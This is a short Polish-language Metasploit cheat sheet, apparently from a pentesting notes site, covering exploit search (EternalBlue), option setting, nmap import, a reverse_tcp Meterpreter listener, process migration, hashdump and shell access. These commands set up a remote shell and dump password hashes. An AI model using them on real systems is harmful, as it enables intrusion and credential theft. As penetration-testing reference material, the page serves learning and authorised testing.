---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# metasploit

`msfconsole`

\#szukanie exploitu

```
search exploit eternalblue
```

\#użycie exploitu

```
use
```

\#argumenty w exploicie, które trzeba wypełnić

```
show options
```

\#importowanie bazy np z nmapa (zapisanego jako XML nmap -oX)

```
db_import baza.xml
```

\#uruchomienie nmapa w metasploicie

```
db_nmap -A 10.20.10.4
```

\#ustawianie atrybutów

```
set LHOST RHOST LPORT RPORT
```

\#uruchomienie

```
run
```

\#używanie skryptów

```
msfconsole -r plik 
/usr/share/metasploit-framework/scripts/resource/
```

\#włączanie listenera use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost set lport exploit

```
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp 
set lhost 
set lport 
exploit
```

\#migrowanie w meterpreterze do innego procesu o id 1300

```
migrate 1300
```

\#zrzut hashy haseł

```
hashdump
```

\#używanie shell zamiast meterpretera - będą działać Windowsowskie komendy (np: whoami)

```
shell
```
